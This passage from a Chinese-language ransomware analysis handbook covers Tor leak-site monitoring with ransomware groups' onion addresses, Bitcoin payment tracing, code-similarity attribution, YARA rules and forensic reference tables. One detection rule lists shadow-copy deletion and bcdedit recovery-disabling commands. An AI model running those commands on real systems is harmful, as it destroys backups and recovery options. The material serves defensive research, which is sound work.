在 Tor 环境中安全访问泄漏站点并提取情报
"""
import json
import time
import hashlib
from datetime import datetime

# 运行要求：Tor SOCKS5 代理运行在 127.0.0.1:9050
import requests
session = requests.Session()
session.proxies = {
    'http': 'socks5h://127.0.0.1:9050',
    'https': 'socks5h://127.0.0.1:9050'
}
session.headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/115.0'}

# === 已知泄漏站点列表（需持续更新）===
LEAK_SITES = {
    # 键: 活跃勒索软件组名
    # 值: 已知 .onion 泄漏站点（可能随时变更）
    # 警告：这些 URL 仅用于安全研究，访问前确认法律合规
    "lockbit": [
        "http://lockbitaptc2iq4atewz2ise62q7wbatv6binuewmwviyrsvix7hayoutid.onion",
    ],
    "blackcat_alphv": [
        "http://alphvmmm27o3abo3r2mlmjrpdmuperl6wcohyj6lhd4g27gte6pxvqyd.onion",
    ],
    "cl0p": [
        "http://santat7kpllt6iyvqbr7q4amdv6dzrl.onion",
    ],
    # ... 更多站点
}

def monitor_leak_site(group_name, url):
    """监控单个泄漏站点，提取受害者列表"""
    try:
        resp = session.get(url, timeout=60)
        resp.raise_for_status()

        # 保存原始页面（用于后续 diff）
        page_hash = hashlib.sha256(resp.content).hexdigest()
        timestamp = datetime.utcnow().isoformat()

        # 提取受害者信息（HTML 解析，每个站点结构不同）
        # 以下为通用模式
        victim_data = {
            'group': group_name,
            'url': url,
            'timestamp': timestamp,
            'page_hash': page_hash,
            'status_code': resp.status_code,
            'content_length': len(resp.content),
            'victims': []
        }

        # 保存原始响应
        filename = f"leak_{group_name}_{timestamp.replace(':','-')}.html"
        with open(filename, 'wb') as f:
            f.write(resp.content)

        print(f"[+] {group_name}: {resp.status_code} | {len(resp.content)} bytes | hash={page_hash[:16]}...")
        return victim_data

    except Exception as e:
        print(f"[-] {group_name} ({url}): {e}")
        return None

def extract_victim_indicators(html_content):
    """从泄漏页面提取受害者指标"""
    import re

    indicators = {
        'company_names': set(),
        'domains': set(),
        'countries': set(),
        'data_sizes': set(),
        'deadlines': set(),
    }

    # 常见模式匹配
    indicators['domains'] = set(re.findall(
        r'(?:[a-zA-Z0-9-]+\.)+[a-zA-Z]{2,}', html_content
    ))
    indicators['countries'] = set(re.findall(
        r'\b(USA|UK|Germany|France|Canada|Australia|Japan|Brazil|India|China)\b',
        html_content
    ))
    indicators['data_sizes'] = set(re.findall(
        r'\d+\.?\d*\s*(?:GB|TB|MB|KB)', html_content
    ))
    indicators['deadlines'] = set(re.findall(
        r'\d{4}-\d{2}-\d{2}(?:\s\d{2}:\d{2})?', html_content
    ))

    return indicators

# === 批量监控 ===
if __name__ == "__main__":
    results = []
    for group, urls in LEAK_SITES.items():
        for url in urls:
            data = monitor_leak_site(group, url)
            if data:
                results.append(data)
            time.sleep(5)  # 避免触发速率限制

    # 输出汇总
    with open('leak_monitor_results.json', 'w') as f:
        json.dump(results, f, indent=2, default=str)
    print(f"\n[+] Monitored {len(results)} leak sites")
```

#### 9.2 泄漏站点情报收集方法

| 来源 | 方法 | 工具 | 情报价值 |
|------|------|------|----------|
| Tor 泄漏站点 | 页面爬取/截图 | Tor Browser, wget via SOCKS | 受害者列表、数据样本 |
| Telegram 频道 | 消息监控 | Telethon, Telegram API | 新受害者公告、谈判对话 |
| 网络犯罪论坛 | 定期访问 | Tor, 论坛账号 | RaaS 加盟招募、内部分享 |
| RSS/Atom feeds | 自动化订阅 | feedparser | 泄漏站点更新通知 |
| Twitter/X | 关键词监控 | Twitter API, twint | 勒索软件组公关宣传 |
| Pastebin 类站点 | 关键词搜索 | 自动化脚本 | 泄漏数据片段 |
| Blockchain 浏览器 | 地址监控 | blockchain.com API | 支付追踪 |
| Shodan/Censys | IoT/服务器搜索 | API 查询 | 受害基础设施发现 |
| VirusTotal | 样本搜索 | VT API | 家族样本收集 |
| MITRE ATT&CK | 技术匹配 | ATT&CK Navigator | TTP 映射与对比 |

### 10. 加密货币支付追踪

#### 10.1 比特币交易追踪脚本

```python
#!/usr/bin/env python3
"""
=== 比特币交易追踪脚本 ===
追踪勒索软件支付地址的交易流向
使用 blockchain.com API（免费，无需 API key）
"""
import requests
import json
from collections import defaultdict
from datetime import datetime

BLOCKCHAIN_API = "https://blockchain.info"

def get_address_info(address):
    """获取比特币地址详细信息"""
    url = f"{BLOCKCHAIN_API}/rawaddr/{address}"
    resp = requests.get(url, params={'limit': 50})
    resp.raise_for_status()
    return resp.json()

def get_address_balance(address):
    """获取地址余额（BTC）"""
    url = f"{BLOCKCHAIN_API}/balance"
    resp = requests.post(url, data=json.dumps({"addresses": [address]}))
    resp.raise_for_status()
    data = resp.json()
    return data[address] / 100000000  # satoshi → BTC

def trace_transactions(address, depth=2, min_btc=0.01):
    """
    追踪从指定地址发出的交易
    address: 勒索软件支付地址
    depth: 追踪深度（跳数）
    min_btc: 最小交易金额阈值
    """
    visited = set()
    trace_graph = defaultdict(list)

    def _trace(addr, current_depth):
        if current_depth > depth or addr in visited:
            return
        visited.add(addr)

        print(f"{'  ' * current_depth}[Depth {current_depth}] Tracing: {addr}")

        try:
            data = get_address_info(addr)
        except Exception as e:
            print(f"{'  ' * current_depth}  [ERROR] {e}")
            return

        # 分析支出交易（从该地址发出的 BTC）
        for tx in data.get('txs', []):
            # 计算从目标地址支出的金额
            input_value = 0
            for inp in tx.get('inputs', []):
                if inp.get('prev_out', {}).get('addr') == addr:
                    input_value += inp['prev_out'].get('value', 0)

            if input_value == 0:
                continue  # 此交易中该地址无支出

            input_btc = input_value / 100000000
            if input_btc < min_btc:
                continue

            # 提取输出地址
            output_addrs = []
            for out in tx.get('out', []):
                if 'addr' in out and out['addr'] != addr:
                    output_addrs.append({
                        'address': out['addr'],
                        'value_btc': out['value'] / 100000000
                    })

            tx_info = {
                'tx_hash': tx['hash'],
                'time': datetime.fromtimestamp(tx['time']).isoformat(),
                'input_btc': input_btc,
                'outputs': output_addrs,
                'block_height': tx.get('block_height', 'unconfirmed')
            }
            trace_graph[addr].append(tx_info)

            print(f"{'  ' * current_depth}  TX: {tx['hash'][:16]}... | "
                  f"{input_btc:.4f} BTC → {len(output_addrs)} outputs")

            for out in output_addrs:
                if out['value_btc'] >= min_btc:
                    print(f"{'  ' * current_depth}    → {out['address'][:16]}... "
                          f"({out['value_btc']:.4f} BTC)")
                    _trace(out['address'], current_depth + 1)

        time.sleep(1)  # API rate limit

    import time
    _trace(address, 0)

    # 输出追踪图
    print(f"\n=== Trace Summary ===")
    print(f"Addresses traced: {len(visited)}")
    print(f"Total transactions: {sum(len(v) for v in trace_graph.values())}")

    return dict(trace_graph)

def identify_exchange_deposit(trace_graph):
    """
    识别追踪图中的交易所存款地址
    已知交易所热钱包模式匹配
    """
    # 常见交易所地址前缀（需持续更新）
    KNOWN_EXCHANGE_PATTERNS = {
        'bc1q': 'Potential SegWit (check if exchange)',
        '3J98t1WpEZ73CNmQviecrnyiWrnqRhWNLy': 'Binance cold wallet',
        '3FZbgi29cpjq2GjdwV8eyHuJJnkLtktZc5': 'Binance hot wallet',
        '1KFHE7w8BhaENAswwryaoccDb6qcT6DbYY': 'Huobi hot wallet',
    }

    exchange_hits = []
    for addr, txs in trace_graph.items():
        if addr in KNOWN_EXCHANGE_PATTERNS:
            exchange_hits.append({
                'address': addr,
                'type': KNOWN_EXCHANGE_PATTERNS[addr],
                'transactions': len(txs)
            })
            print(f"[EXCHANGE] {addr}: {KNOWN_EXCHANGE_PATTERNS[addr]}")

    return exchange_hits

# 使用示例
if __name__ == "__main__":
    import sys
    if len(sys.argv) < 2:
        print("Usage: python btc_trace.py <bitcoin_address> [depth]")
        print("Example: python btc_trace.py bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh 2")
        sys.exit(1)

    target = sys.argv[1]
    depth = int(sys.argv[2]) if len(sys.argv) > 2 else 2

    print(f"=== Tracing BTC Address: {target} ===")
    graph = trace_transactions(target, depth=depth)
    exchanges = identify_exchange_deposit(graph)

    if exchanges:
        print(f"\n[!] Found {len(exchanges)} potential exchange deposits")
        print("[!] Exchange deposits may enable law enforcement identification")
```

#### 10.2 区块链分析工具矩阵

| 工具 | 支持链 | 类型 | 成本 | 关键特性 |
|------|--------|------|------|----------|
| blockchain.com Explorer | BTC | Web | 免费 | 基础交易查询，API 速率有限 |
| Blockchair | BTC/ETH/BCH 等 | Web/API | 免费+付费 | 多链搜索、隐私工具 |
| Chainalysis Reactor | BTC/ETH/多链 | 企业 SaaS | 付费(高) | 钱包聚类、风险评分、执法支持 |
| Elliptic Navigator | BTC/ETH/多链 | 企业 SaaS | 付费(高) | 合规监控、钱包标签 |
| TRM Labs | 多链 | 企业 SaaS | 付费 | 实时风险评分、DeFi 覆盖 |
| CipherTrace | 多链 | 企业 SaaS | 付费 | 反洗钱、旅行规则合规 |
| Maltego + BTC 变换 | BTC | 桌面+插件 | 免费+付费 | 可视化关联分析 |
| Blockstream Explorer | BTC | Web | 免费 | 隐私友好、闪电网络支持 |
| BTC.com Explorer | BTC/BCH | Web/API | 免费 | 矿池信息、交易广播 |
| OXT.me | BTC | Web | 免费 | 地址聚类、交易图谱可视化 |

#### 10.3 混币器/隐私币挑战

```
=== 加密货币混淆追踪挑战 ===

1. 混币器（Coin Mixer/Tumbler）
   - 中心化混币器：ChipMixer（已关闭）、Blender.io
   - 去中心化：Tornado Cash（ETH）、Wasabi Wallet（BTC，CoinJoin）
   - 追踪策略：
     * 分析混币器入口和出口的时间关联
     * 金额匹配（精确金额追踪）
     * 交易所 KYC 出口识别

2. 门罗币（Monero - XMR）
   - 默认隐私：环形签名、隐地址、RingCT
   - 追踪挑战：交易不可追踪、金额隐藏
   - 现有分析：Chainalysis 提供有限 XMR 追踪能力
   - 实际案例：少数勒索软件接受 XMR（ALPHV/BlackCat）

3. 跨链桥（Cross-chain Bridge）
   - BTC → ETH → 多种 ERC-20 代币
   - 追踪策略：在桥合约两侧追踪地址关联
   - 工具：链上浏览器 + DeFi 分析平台

4. 闪电网络（Lightning Network）
   - 链下交易，无公开记录
   - 追踪挑战：通道余额变更不可见
   - 当前勒索软件极少使用（技术门槛高）
```

### 11. 家族识别与归因

#### 11.1 代码相似性分析

```python
#!/usr/bin/env python3
"""
=== 勒索软件家族代码相似性检测 ===
通过二进制函数级哈希比对识别重品牌/变种
"""
import hashlib
import pefile
import struct
from collections import defaultdict

def extract_function_signatures(pe_path):
    """从 PE 文件提取函数字节特征"""
    pe = pefile.PE(pe_path)
    signatures = {}

    # 从代码段提取函数块
    for section in pe.sections:
        name = section.Name.rstrip(b'\x00').decode('ascii', errors='ignore')
        if '.text' in name or 'CODE' in name:
            code_data = section.get_data()
            base_addr = section.VirtualAddress + pe.OPTIONAL_HEADER.ImageBase

            # 基于函数序言分割（简化版）
            # 常见 x64 函数序言：48 89 5C 24 (mov [rsp+X], rbx)
            #                     55 (push rbp)
            #                     48 83 EC (sub rsp, X)
            prologue_patterns = [
                bytes([0x48, 0x89, 0x5C, 0x24]),
                bytes([0x48, 0x83, 0xEC]),
                bytes([0x55]),
                bytes([0x53]),  # push rbx
            ]

            functions = []
            for i in range(len(code_data) - 4):
                for pattern in prologue_patterns:
                    if code_data[i:i+len(pattern)] == pattern:
                        # 提取函数块（到下一个序言或 ret）
                        func_start = i
                        func_end = i + 256  # 固定窗口 256 字节

                        # 查找 ret (C3) 或下一个序言
                        for j in range(i + 4, min(i + 4096, len(code_data))):
                            if code_data[j] == 0xC3:
                                func_end = j + 1
                                break
                            for p in prologue_patterns:
                                if code_data[j:j+len(p)] == p:
                                    func_end = j
                                    break

                        func_bytes = code_data[func_start:func_end]
                        if len(func_bytes) >= 16:
                            # 标准化：替换相对偏移为通配符
                            normalized = normalize_bytes(func_bytes)
                            func_hash = hashlib.md5(normalized).hexdigest()
                            functions.append({
                                'offset': hex(base_addr + func_start),
                                'size': len(func_bytes),
                                'hash': func_hash,
                            })
                        break

            signatures[name] = functions

    return signatures

def normalize_bytes(data):
    """
    标准化字节序列：将相对偏移替换为 0x00
    保留操作码，模糊化操作数
    """
    result = bytearray(data)
    i = 0
    while i < len(result) - 1:
        # E8 xx xx xx xx = CALL rel32 → 保留 E8, 清零偏移
        if result[i] == 0xE8 and i + 5 <= len(result):
            result[i+1:i+5] = b'\x00\x00\x00\x00'
            i += 5
        # E9 xx xx xx xx = JMP rel32
        elif result[i] == 0xE9 and i + 5 <= len(result):
            result[i+1:i+5] = b'\x00\x00\x00\x00'
            i += 5
        # 0F 84/85 xx xx xx xx = Jcc rel32
        elif result[i] == 0x0F and i + 6 <= len(result) and result[i+1] in (0x84, 0x85):
            result[i+2:i+6] = b'\x00\x00\x00\x00'
            i += 6
        else:
            i += 1
    return bytes(result)

def compare_families(sig1, sig2):
    """比较两个样本的函数哈希，计算相似度"""
    hashes1 = set(f['hash'] for f in sum(sig1.values(), []))
    hashes2 = set(f['hash'] for f in sum(sig2.values(), []))

    common = hashes1 & hashes2
    similarity = len(common) / max(len(hashes1), len(hashes2), 1) * 100

    print(f"Sample 1 functions: {len(hashes1)}")
    print(f"Sample 2 functions: {len(hashes2)}")
    print(f"Common functions:   {len(common)}")
    print(f"Similarity:         {similarity:.1f}%")

    if similarity > 70:
        print("[!] HIGH similarity — likely same family or rebrand")
    elif similarity > 40:
        print("[?] MODERATE similarity — possibly related or shared code")
    else:
        print("[-] LOW similarity — likely different families")

    return similarity
```

#### 11.2 重品牌检测矩阵

| 原始家族 | 重品牌后 | 检测依据 | 时间线 |
|----------|----------|----------|--------|
| Conti | BlackBasta, Akira, Royal | 共享代码模式、加密结构相同 | 2022 Conti 关闭后 |
| REvil/Sodinokibi | 多个小型团伙 | 自定义 Kaseya 后门代码复用 | 2021 REvil 消失后 |
| DarkSide | BlackMatter | 相同加密尾部结构、C2 API | 2021 DarkSide 关闭 |
| Hermes | Ryuk | 相同文件加密标记结构 | 2018 → Ryuk 演化 |
| Petya/NotPetya | — | MBR 加密 + Salsa20 | 独特 MBR 覆盖技术 |
| LockBit 2.0 | LockBit 3.0 | 代码重构但 Stealer 模块相同 | 2022 年升级 |
| Babuk | Rorschach, Nokoyawa | 加密算法源码泄露后复用 | 2021 Babuk 源码泄露 |

#### 11.3 YARA 检测规则

```yaml
// === YARA Rule 1: WannaCry 通用检测 ===
rule Ransomware_WannaCry_Generic {
    meta:
        author = "Ransomware Analysis Team"
        description = "Detects WannaCry ransomware variants"
        reference = "SHA256: ed01ebfbc9eb5bbea545af4d01bf5f10716618404803d3c36d4e5a1e1e4c3c51"
        date = "2024-01-01"
        tlp = "WHITE"
        hash = "ed01ebfbc9eb5bbea545af4d01bf5f10716618404803d3c36d4e5a1e1e4c3c51"

    strings:
        // WannaCry 勒索信特征
        $ransom_note1 = "Your files have been encrypted" ascii wide
        $ransom_note2 = "OOPS, your important files are encrypted" ascii wide

        // WannaCry 特定加密标记
        $magic1 = { 57 61 6E 6E 61 43 72 79 33 2E 30 }  // "WannaCry3.0"
        $magic2 = { 57 61 6E 6E 61 44 65 63 72 79 70 74 } // "WannaDecrypt"

        // 任务启动开关域
        $killswitch_domain = "iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea.com" ascii

        // RSA 公钥片段（WannaCry 硬编码）
        $rsa_pubkey = { 52 53 41 32 00 01 00 01 00 }  // RSA2 header

        // 加密文件扩展名
        $ext1 = ".WNCRY" ascii wide
        $ext2 = ".WCRY" ascii wide

    condition:
        uint16(0) == 0x5A4D and  // MZ header
        (
            (1 of ($ransom_note*) and 1 of ($magic*)) or
            (1 of ($ext*) and $rsa_pubkey) or
            $killswitch_domain
        )
}

// === YARA Rule 2: LockBit 3.0 检测 ===
rule Ransomware_LockBit3_Generic {
    meta:
        author = "Ransomware Analysis Team"
        description = "Detects LockBit 3.0 (LockBit Black) ransomware"
        reference = "Active since 2022, rebranded from LockBit 2.0"
        date = "2024-01-01"
        tlp = "WHITE"

    strings:
        // LockBit 3.0 勒索信特征
        $note1 = "LockBit 3.0" ascii wide
        $note2 = "lockbit3.0" ascii wide
        $note3 = "LockBit Black" ascii wide

        // LockBit 特定配置标记
        $config_marker1 = { 4C 6F 63 6B 42 69 74 33 2E 30 } // "LockBit3.0"
        $config_marker2 = "LockBit-encrypt" ascii

        // 文件加密标记（加密后的文件尾部魔数）
        $file_marker = { 4C 4F 43 4B 42 49 54 } // "LOCKBIT"

        // C2 通信特征
        $onion1 = ".onion/" ascii
        $api_register = "/api/v1/register" ascii

        // 反分析字符串
        $anti_debug = "Analysis is not permitted" ascii wide
        $vm_detect = "VirtualBox" ascii wide

    condition:
        uint16(0) == 0x5A4D and
        filesize < 5MB and
        (
            (1 of ($note*) and $file_marker) or
            (1 of ($config_marker*) and 1 of ($note*)) or
            ($config_marker2 and $api_register and $onion1)
        )
}

// === YARA Rule 3: BlackCat/ALPHV 检测 ===
rule Ransomware_BlackCat_ALPHV_Generic {
    meta:
        author = "Ransomware Analysis Team"
        description = "Detects BlackCat/ALPHV ransomware (Rust-based)"
        reference = "First Rust-based ransomware, active since 2021"
        date = "2024-01-01"
        tlp = "WHITE"

    strings:
        // Rust 二进制特征
        $rust_panic1 = "panic occurred" ascii
        $rust_panic2 = "rust_begin_unwind" ascii

        // BlackCat 特定字符串
        $blackcat1 = "BLACKCAT" ascii wide
        $blackcat2 = "blackcat" ascii wide
        $alphv1 = "ALPHV" ascii wide
        $alphv2 = "alphv" ascii

        // 配置 JSON 键名（BlackCat 使用 JSON 配置）
        $config_key1 = "\"encryption_type\"" ascii
        $config_key2 = "\"file_extension\"" ascii
        $config_key3 = "\"note_filename\"" ascii
        $config_key4 = "\"attack_mode\"" ascii
        $config_key5 = "\"affiliates\"" ascii

        // 加密相关字符串
        $chacha = "ChaCha20" ascii
        $aes = "AES-256" ascii
        $x25519 = "X25519" ascii

        // Tor 通信
        $onion_addr = ".onion" ascii

    condition:
        // ELF 或 PE 格式
        (uint16(0) == 0x5A4D or uint16(0) == 0x457F) and
        filesize < 10MB and
        (
            // Rust 特征 + BlackCat 标识
            (1 of ($rust_panic*) and 1 of ($blackcat*, $alphv*)) or
            // 配置键 + 加密算法
            (3 of ($config_key*) and 1 of ($chacha, $aes, $x25519) and $onion_addr) or
            // 直接标识
            ($blackcat1 and $alphv1)
        )
}

// === YARA Rule 4: 通用勒索软件检测 ===
rule Ransomware_Generic_Indicators {
    meta:
        author = "Ransomware Analysis Team"
        description = "Generic ransomware behavior indicators"
        date = "2024-01-01"
        tlp = "WHITE"

    strings:
        // VSS 删除命令
        $vss1 = "vssadmin delete shadows /all /quiet" ascii wide nocase
        $vss2 = "vssadmin delete shadows" ascii wide nocase
        $vss3 = "wmic shadowcopy delete" ascii wide nocase

        // BCDEdit 禁用恢复
        $bcdedit1 = "bcdedit /set {default} recoveryenabled No" ascii wide nocase
        $bcdedit2 = "bcdedit /set {default} bootstatuspolicy ignoreallfailures" ascii wide nocase

        // 勒索信关键词
        $ransom1 = "your files are encrypted" ascii wide nocase
        $ransom2 = "decrypt your files" ascii wide nocase
        $ransom3 = "pay the ransom" ascii wide nocase
        $ransom4 = "bitcoin payment" ascii wide nocase

        // 加密文件操作
        $enc1 = "CryptEncrypt" ascii wide
        $enc2 = "BCryptEncrypt" ascii wide

        // 文件枚举
        $enum1 = "FindFirstFileW" ascii wide
        $enum2 = "FindNextFileW" ascii wide

    condition:
        uint16(0) == 0x5A4D and
        (
            // VSS 删除 + 勒索信关键词
            (1 of ($vss*) and 1 of ($ransom*)) or
            // BCDEdit + 加密 API + 文件枚举
            (1 of ($bcdedit*) and 1 of ($enc*) and 1 of ($enum*)) or
            // 多个勒索信关键词 + 加密 API
            (2 of ($ransom*) and 1 of ($enc*))
        )
}
```

---

## Quick Reference Tables

### 勒索软件家族加密矩阵

| 家族 | 对称 | 非对称 | 密钥长度 | 模式 | 已知解密器 | 弱点 |
|------|------|--------|----------|------|------------|------|
| WannaCry | AES-128 | RSA-2048 | 128/2048 | CBC | Wanakiwi (XP-7) | 内存密钥恢复 |
| Ryuk | AES-256 | RSA-4096 | 256/4096 | ECB | 无 | ECB 模式但密钥管理安全 |
| Conti | AES-256 | RSA-4096 | 256/4096 | CBC | 无 | 源码泄露后可深入分析 |
| LockBit 3.0 | AES-256 | RSA/ECC | 256/2048 | CTR | 无 | — |
| BlackBasta | ChaCha20 | RSA-4096 | 256/4096 | Stream | 无 | Conti 代码复用可对比 |
| ALPHV/BlackCat | AES+ChaCha20 | RSA/ECC | 256/4096 | CTR | 无 | Rust 二进制可逆向 |
| STOP/Djvu | AES-256 | RSA-2048 | 256/2048 | ECB | 仅离线密钥 | 离线密钥可恢复 |
| Cerber | AES-256 | RSA | 256/2048 | CBC | 无 | — |
| Hive v1 | AES-256 | RSA-2048 | 256/2048 | CTR | 有（密钥恢复攻击） | 加密方案设计缺陷 |
| Magniber | AES-256 | RSA-2048 | 256/2048 | ECB | 部分版本 | ECB 模式 |
| Petya/NotPetya | Salsa20 | — | 256 | Stream | 部分版本 | MBR 覆盖可修复 |
| GandCrab | AES-256 | RSA-2048 | 256/2048 | CBC | BitDefender | — |
| Dharma/CrySiS | AES-256 | RSA-2048 | 256/2048 | CBC | 部分 | 密钥可能存储在内存 |

### 常见勒索软件工件检查清单

| 工件类型 | 位置 | 提取方法 | 分析目的 |
|----------|------|----------|----------|
| 勒索信 | 桌面 / 每个目录 | 文件搜索 `.txt .html .hta` | 家族识别、C2 onion 地址 |
| 加密文件 | 任意用户目录 | 保留完整样本 | 加密模式分析 |
| 文件尾部结构 | 加密文件末尾 | hex editor / 脚本解析 | 密钥存储格式 |
| 扩展名映射 | 重命名模式 | 文件名分析 | 家族特征 |
| PowerShell 脚本 | 事件日志 4104 | `Get-WinEvent` | 攻击链还原 |
| VSS 删除证据 | PowerShell 日志 | 事件日志搜索 | 确认破坏行为 |
| 计划任务 | TaskScheduler | `Get-ScheduledTask` | 持久化机制 |
| Temp 文件 | `%TEMP%` | 文件枚举 | 释放的子载荷 |
| RDP 日志 | TerminalServices 事件 | 事件日志查询 | 横向移动时间线 |
| SMB 日志 | SMBServer/Audit | 事件日志查询 | 网络共享加密 |
| Prefetch | `C:\Windows\Prefetch` | PECmd 解析 | 执行时间线 |
| MFT | `$MFT` | MFTECmd | 完整文件时间线 |
| 注册表 Run 键 | HKCU/HKLM Run | 注册表查询 | 自启动持久化 |
| WMI 订阅 | ROOT\Subscription | WMI 枚举 | 无文件持久化 |
| BITS 传输 | BITS 队列 | `Get-BitsTransfer` | 后台下载 |
| USN Journal | `$Extend\$UsnJrnl` | FsUsnJournal | 文件变更日志 |

### MITRE ATT&CK 映射

| 战术 | 技术 ID | 技术名称 | 勒索软件中的表现 |
|------|---------|----------|------------------|
| Initial Access | T1190 | Exploit Public-Facing App | VPN/RDP 漏洞利用 |
| Initial Access | T1566 | Phishing | 鱼叉钓鱼投递载荷 |
| Execution | T1059.001 | PowerShell | VSS 删除、横向移动脚本 |
| Execution | T1059.003 | Windows Command Shell | 批处理加密启动器 |
| Persistence | T1053.005 | Scheduled Task | 定时加密任务 |
| Persistence | T1547.001 | Registry Run Keys | 自启动注册 |
| Defense Evasion | T1027 | Obfuscated Files/Info | 载荷混淆/加壳 |
| Defense Evasion | T1070.004 | File Deletion | 删除自身、清理日志 |
| Defense Evasion | T1562.001 | Disable Security Tools | 禁用 Defender |
| Credential Access | T1003 | OS Credential Dumping | Mimikatz 提取凭证 |
| Lateral Movement | T1021.001 | Remote Desktop Protocol | RDP 横向传播 |
| Lateral Movement | T1021.002 | SMB/Windows Admin Shares | SMB 加密网络共享 |
| Exfiltration | T1567 | Exfiltration Over Web Service | rclone/Mega 数据外传 |
| Exfiltration | T1048 | Exfiltration Over Alternative Protocol | 自定义协议外传 |
| Command & Control | T1090 | Proxy | Tor 代理通信 |
| Command & Control | T1071.001 | Web Protocols | HTTPS C2 通信 |
| Command & Control | T1090.003 | Multi-hop Proxy | Tor + 域前置 |
| Impact | T1486 | Data Encrypted for Impact | 文件加密（核心行为） |
| Impact | T1490 | Inhibit System Recovery | VSS 删除、禁用修复 |
| Impact | T1489 | Service Stop | 停止数据库/备份服务 |
| Impact | T1498 | Network Denial of Service | 部分变种附带 DDoS |

### 泄漏站点情报收集方法

| 来源 | 方法 | 工具 | 情报价值 |
|------|------|------|----------|
| Tor 泄漏站点 | 页面爬取/截图 | Tor Browser + SOCKS5 | 受害者列表、数据样本 |
| Telegram 频道 | 消息监控 | Telethon/官方 API | 新攻击公告 |
| 网络犯罪论坛 | 定期访问 | Tor | RaaS 招募、内部泄露 |
| Twitter/X | 关键词监控 | API / twint | 勒索组宣传 |
| Blockchain 浏览器 | 地址监控 | blockchain.com API | 支付追踪 |
| Shodan/Censys | 搜索 | API 查询 | 受害者基础设施 |
| VirusTotal | 样本搜索 | VT API | 样本收集 |
| RSS feeds | 自动订阅 | feedparser | 泄漏更新通知 |
| ID Ransomware | 文件提交 | web service | 家族识别 |
| NoMoreRansom | 解密器查询 | web service | 解密方案查找 |

---

## 操作安全注意事项

- 所有勒索软件分析必须在隔离的虚拟机/沙箱环境中进行
- Tor 泄漏站点访问需通过专用研究网络，使用 SOCKS5 代理
- 加密货币追踪脚本仅用于合法安全研究，遵守当地法律
- 不要在任何分析环境中保留生产数据或真实凭证
- 泄漏站点监控频率不宜过高（建议间隔 ≥ 5 分钟），避免被封锁
- 所有提取的 IOC 应通过多源验证后再用于生产防御
- 分析报告不应包含受害者可识别信息（PII）除非有法律要求

---

## C. 补充章节（2025-2026 联网复核）

### C.1 AI/LLM 辅助勒索软件逆向分析

#### C.1.1 ARES — 智能体式勒索软件解密系统（VB2026）

Raviv Rachmiel 在 Virus Bulletin 2026 大会发布 ARES（Agentic Reverse Engineer System），是首个专门针对勒索软件加密文件的**智能体式自动解密系统**。

**核心能力：**
- 自动分析勒索软件加密方案（无需人工逆向）
- 从样本中提取加密逻辑 → 自动构建解密器
- 支持复杂混合加密方案（AES+RSA/ECC）
- 使用 LLM 辅助伪代码理解与密钥恢复策略制定

**架构：**
```
ARES 工作流：
├── 阶段 1：样本静态分析
│   ├── 二进制 → 反编译 → LLM 辅助函数语义理解
│   ├── 识别加密 API 调用链
│   └── 提取硬编码公钥/常量
├── 阶段 2：加密方案自动还原
│   ├── 密钥生成流程追踪
│   ├── 加密模式识别（CBC/CTR/ECB/ChaCha20）
│   └── 文件尾部结构解析
├── 阶段 3：弱点检测
│   ├── 弱 PRNG → 可预测密钥恢复
│   ├── 硬编码密钥 → 直接提取
│   ├── 内存残留密钥 → 内存取证集成
│   └── 实现错误 → 利用手动构建攻击
└── 阶段 4：自动生成解密器
    └── 输出：针对该家族的可执行解密工具
```

> **参考：** [VB2026 ARES Presentation](https://www.virusbulletin.com/conference/vb2026/abstracts/meet-ares-agentic-reverse-engineer-decrypts-sophisticated-ransomware-encrypted-files/)

#### C.1.2 LLM 作为逆向工程副驾驶（Cisco Talos）

Cisco Talos 2025 年发布研究，系统评估 LLM 在恶意软件逆向工程中的实用价值：

**工作流集成模式：**
```python
# === LLM 辅助勒索软件分析 Prompt 模板 ===

# 1. 函数语义理解
PROMPT_FUNCTION_ANALYSIS = """
分析以下反编译伪代码，识别其功能：
- 是否为加密/解密函数？
- 使用的加密算法？
- 密钥来源？
- 是否存在实现弱点？

{decompiled_code}
"""

# 2. 加密方案识别
PROMPT_CRYPTO_IDENTIFY = """
基于以下 API 调用序列，判断加密方案：
{api_call_sequence}

请输出：
1. 对称加密算法及模式
2. 非对称加密算法及密钥长度
3. 密钥管理方式
4. 潜在弱点分析
"""

# 3. 勒索信分析（家族识别）
PROMPT_RANSOM_NOTE = """
分析以下勒索信文本，识别勒索软件家族：
{ransom_note_text}

参考特征：
- 语言风格与模板匹配
- 支付方式（BTC/XMR/其他）
- onion 地址格式
- 威胁内容模式
"""
```

**适用场景与局限：**
| 场景 | LLM 效果 | 局限 |
|------|----------|------|
| 函数语义理解 | ★★★★☆ 快速识别加密/网络/文件操作函数 | 大函数上下文截断 |
| 加密模式识别 | ★★★★★ 识别 CryptoAPI/CNG/OpenSSL 调用模式 | 自定义加密实现可能误判 |
| 弱点检测 | ★★★☆☆ 可识别常见实现错误 | 复杂逻辑链分析能力有限 |
| 家族归因 | ★★★★☆ 勒索信/配置模式匹配 | 零日变种无训练数据 |

> **参考：** [Cisco Talos - Using LLMs as a Reverse Engineering Sidekick](https://blog.talosintelligence.com/using-llm-as-a-reverse-engineering-sidekick/)

#### C.1.3 学术研究前沿

| 研究 | 来源 | 关键发现 |
|------|------|----------|
| AI-Driven Malware Reverse Engineering Systems | ResearchGate 2025 | ML/DL + 符号执行混合框架自动化恶意软件分析 |
| LLM for Software Security: Code Analysis | arXiv 2504.07137 | LLM 在恶意软件代码分析中的综合学术综述 |
| Challenges in Agentic Reverse Engineering | arXiv 2604.14317 | 静态/动态/混合智能体在逆向工程中的挑战与方向 |
| Unit 42: AI Use in Malware | Palo Alto 2025 | 发现 Go 语言 dropper 使用 LLM 评估目标系统 |

#### C.1.4 Agentic RE 工具生态

| 工具 | 类型 | 说明 |
|------|------|------|
| **ARES** (VB2026) | 勒索软件专项 | 智能体自动解密勒索软件加密文件 |
| **Kong** (GitHub) | 通用逆向 | NSA 级框架，自动化完全混淆/剥离二进制分析 |
| **GhidraMCP** | MCP 集成 | 118+ 工具，LLM 直接操控 Ghidra |
| **IDAssist** | IDA 插件 | LLM 驱动的函数重命名/注释/漏洞检测 |
| **DecompAI / Malva.RE** | 在线平台 | AI 辅助反编译与恶意软件行为分析 |

### C.2 2025-2026 新兴勒索软件家族加密特征

#### C.2.1 新兴家族加密矩阵

| 家族 | 对称算法 | 非对称算法 | 密钥管理 | 加密策略 | 特殊特征 |
|------|----------|------------|----------|----------|----------|
